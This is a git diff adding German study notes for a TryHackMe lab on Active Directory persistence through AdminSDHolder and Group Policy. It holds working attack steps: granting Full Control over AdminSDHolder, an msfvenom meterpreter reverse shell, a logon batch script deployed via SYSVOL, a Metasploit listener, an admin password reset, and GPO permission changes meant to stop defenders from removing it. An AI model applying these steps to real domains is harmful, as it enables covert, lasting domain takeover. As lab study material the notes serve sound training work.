@@ -833,4 +833,160 @@ Ein Prozess mit dem Namen "SDProp" nimmt die ACL vom AdminSDHolder Container und
 
 ### Persisting with AdminSDHolder
 
+Um unsere Persistence im AdminSDHolder Container bzw. dem Template zu realisieren nutzen wir die Microsoft Management Console MMC. Wir bauen eine RDP Verbindung mit unserem Low-Priv User zu THMWRK1 auf und starten dort eine Console über Runas mit den Administrator Credentials. Von dieser Console aus starten wir MMC:
+
+>runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
+
+In der MMC fügen das AD Users and Groups Snap-In hinzu und aktiveren die Advanced Features oben im Menü unter View.
+
+![alt text](images/image2.png)
+
+Rechtsklick auf AdminSDHolder und dann Eigenschaften/Security aufrufen:
+
+![alt text](images/image3.png)
+
+Okay lass jetzt unseren Low-Priv User hinzufügen und Full Controll geben:
+
+- Klicke auf Add
+- Suche unseren Low-Priv User und klicke auf Check-Names
+- Klicke auf Ok
+- Klicke auf Allow bei Full Controll
+- Klicke auf Apply
+- Klicke auf Ok
+
+Es sollte anschließend so aussehen:
+
+![alt text](images/image4.png)
+
+Jetzt müssten wir im Prinzip noch 60 Minuten warten bis das ganze auf die Geschützten Gruppen angewendet wird. Das erledigt der Security Descriptor Propagator SDProp. 
+Wir wollen natürlich nicht so lange warten und starten den Prozess manuell. Dazu nutzen wir ein Script mit dem Namen Invoke-ADSDPropagation:
+
+```bash
+PS C:\Tools> Import-Module .\Invoke-ADSDPropagation.ps1 
+PS C:\Tools> Invoke-ADSDPropagation
+```
+
+Da wir nun komplette Kontrolle über die Domain Admin Gruppe mit unserem User haben, können wir unseren User auch dieser Gruppe hinzufügen:
+
+![alt text](images/image5.png)
+
+Man stelle sich diese Technik in Kombo mit der Group Membership Technik vor. Gerade wenn das Blue Team unseren Zugang gesperrt hat durch diverse Änderungen der Gruppen, können sie das ganze nach 60 Minuten wieder machen. Solange das Blue Team nicht versteht, dass die Rechte über AdminSDHolder Gruppe vergeben werden, werden sie sich alle 60 Minuten den Kopf zerbrechen, was da los ist. Da das Persistance über einen legitimen AD Service läuft, werden sie auch nicht schlauer aus der ganze Sache, jedesmal wenn es passiert. 
+Wollen wirklich persistent sein, dann geben der Domain Users Gruppe Full Controll in der AdminSDHolder Gruppe. Das bedeutet wirklich jeder low-priv User hat Full Controll über jede kritische Admin Gruppe. Kombiniert mit einer vollen DCSync muss das Blue Team alle einzelnen Zugangsdaten in der Domain ändern um uns auszusperren.
+
+# Persistence through GPOs
+
+Die letzte Persistance Technik läuft über die Group Policy Object GPO. Die GPO´s haben wir eigentlich schon kennengelernt.
+
+Grou Policy Management im Active Directory stellt ein zentrallen Mechanimsus bereit um die lokale Policy Configuration jeder Maschine in der Domain zu ändern. 
+Das beinhaltet die konfiguration wie bspw. die Mitgliedschaft in einer gesperrten Gruppe, Firewall und Antiviren Konfiguration oder welche Scripts beim Start des Computer ausgeführt werden sollen. 
+
+Auch wenn es ein super Tool zum managen ist, ist es auch ein sehr beliebtes Angriffsziel um Zugänge zum gesamten Netzwerk zu erhalten. Was das ganze noch schlimmer macht, ein Angreifer kann GPO´s dermaßen verstecken, dass es fast unmöglich wird, sie zu erkennen.
+
+### Domain Wide Persistance
+
+Das sind beliebte GPO Persistence Techniken:
+
+- Restricted Group Membership: Das erlaubt uns administrativen Zugang zu allen Hosts in der Domain
+- Logon Script Deployment: Das sichert uns einen Shell Callback wenn ein User sich an einem Host in der Domain authentifiziert.
+
+Es gibt noch weitere Möglichkeiten. Es wäre ratsam sich noch andere GPO´s anzuschauen. Restricted Group Membership haben wir bereits im Exploiting AD Room kennengelernt, daher schauen wir uns jetzt die zweite GPO an. Zugang zu allen Hosts ist ganz nice, aber es auch ganz gut sein Zugang zu bekommen, sobald sich ein Administrator aktiv auf diesen einloggt. Um das zu realisieren, erstellen wir eine GPO die mit der Admin OU verbunden ist, was uns erlaubt jedesmal eine Shell zu bekommen, wenn diese sich auf einem Host authentifizieren.
+
+### Preparation
+
+Bevor wir loslegen müssen wir unsere Shell, Listener und eine BAT Datei erstellen, die unsere Shell ausführt. Das machen wir mit MSFVENOM. Erstmal unsere Shell:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
+```
+
+Dann erstellen wir mit "nano akrebs_script.bat" ein neue BAT Datei und schreiben in diese folgendes:
+
+```bash
+copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
+```
+
+Mit SCP und unseren Admin Creds laden wir die beiden Sachen jetzt in den SYSVOL Ordner auf dem Domain Controller:
+
+```bash
+$thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+
+$thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+```
+
+Danach starten wir noch den Listener:
+
+>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
+
+Damit ist alles vorbereitet und wir können die GPO erstellen. Wir öffnen wie bereits gezeigt eine MMC mit einem RUNAS Kommando auf THMWRK1.
+
+### GPO Creation
+
+- In der Runas gespawnten Konsole geben wir MMC ein
+- Wir fügen Group Policy Management als Snap-In hinzu
+
+![alt text](images/image6.png)
+
+Wir können technisch gesehen jetzt unseren Content in die Default Domain Policy schreiben und diese wird dann an alle AD Objekte übergeben. Allerdings schauen wir uns einen anderen Ansatz an um den Prozess zu verdeutlichen.
+Wir erstellen eine GPO die auf allen Admins angewendet wird.
+Dazu Rechtsklick auf die Admins OU und dann auf Create GPO in this domain and link it here. Gebe einfach einen Namen ein wie "akrebs - persisting GPO"
+
+![alt text](images/image7.png)
+
+Danach einen Rechtsklick auf unsere GPO und Enforce auswählen. Das stellt sicher dass unsere GPO übernommen wird, selbst wenn sie konflikte auslösen kann. Selbst wenn das Blue Team eine GPO erstellt die unsere Änderungen löscht, belibt unsere GPO dennoch gültig.
+
+Nochmal Rechtsklick auf unsere GPO und dann auf EDIT:
+
+- Under User Configuration, expand Policies->Windows Settings.
+- Select Scripts (Logon/Logoff).
+- Right-click on Logon->Properties
+- Select the Scripts tab.
+- Click Add->Browse.
+
+Wir navigieren zu dem Verzeichnis, in dem unsere Script Datei und die Shell liegt:
+
+![alt text](images/image8.png)
+
+Wir wählen unsere Batch Datei aus und bestätigen das ganze. Jetzt kriegen wir jedesmal ein Callback wenn sich ein Admin auf einem Host anmeldet.
+
+Um das ganze zu simulieren setzen wir das Passwort eines Tier 1 Admins Accounts zurück und authentifizieren uns an einem Server. 
+
+Mit dem Befehl Get-AdGroupMember -Identity "Tier 1 Admins" erhalte ich alle Tier 1 Admins. Dann wähle ich einen aus, bei dem ich das Passwort resetten möchte.
+
+```bash
+$password = ConvertTo-SecureString "password.123" -AsPlainText -Force
+Set-AdAccountPassword -Identity "t1_vincent.watson" -Reset -NewPassword $password
+```
+
+Nutze ich diesen Account jetzt und erstelle eine RDP Session, bekomme ich eine Shell auf meinem Listener, sobald ich mich mit diesem User authentifiziere.
+
+### Hiding in Plain Sight
+
+Da wir jetzt wissen, dass unser Persistence Technik funktioniert hat wird es Zeit, unseren Zugang dauerhaft zu sichern, damit das Blue Team diesen nicht einfach entfernen kann. Also zurück zu unserer MMC Console in unsere GPO und dann auf Delegation:
+
+![alt text](images/image9.png)
+
+Standardmäßig haben alle Administratoren die Berechtigung, GPO´s zu bearbeiten. Diese Berechtigung entfernen wir.
+
+- Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
+- Click on all other groups (except Authenticated Users) and click Remove.
+
+Dann sollte es so aussehen:
+![alt text](images/image10.png)
+
+Dann nochmal auf Advanced unten und den Create Owner entfernen:
+
+![alt text](images/image11.png)
+
+Grundsätzlich haben alle Authenticated Users die Möglichkeit die GPO zu lesen. Das ist nötig, denn sonst könnte der User die GPO nicht lesen wenn er sich authentifiziert und die GPO könnte nicht ausgeführt werden. Wenn wir kein Logon Script hätten, könnten wir auch diese Berechtigung löschen, damit wirklich niemand unsere GPO lesen kann.
+
+Wir können Authenticated Users durch Domain Computer ersetzen um sicherzustellen, dass Computer in der Domain die GPO lesen und anwenden können, aber alle User davon abgehalten werden. Das testen wir mal, aber das würde unseren Callback unbrauchbar machen. Das muss unbedingt bedacht werden.
+
+1. Klicke auf ADD
+2. Tippe Domain Computer ein und dann auf Check Names und OK
+3. Wähle Read Permessions aus und klicke OK
+4. Klicke auf Authenticated Users und dann auf Remove
+
+Wenn das erledigt ist, können wir die GPO nichtmehr lesen und wir kriegen eine Fehlermeldung.
+
+Jetzt können auch die höchsten Berechtigungsstufen unsere GPO nichtmehr löschen, es sei denn, sie übernehmen einen Domain Controller Account. Extrem schädliche Attacke und sehr schwer zu entfernen, da wir selber nichtmal mehr Zugriff auf die GPO haben.
 
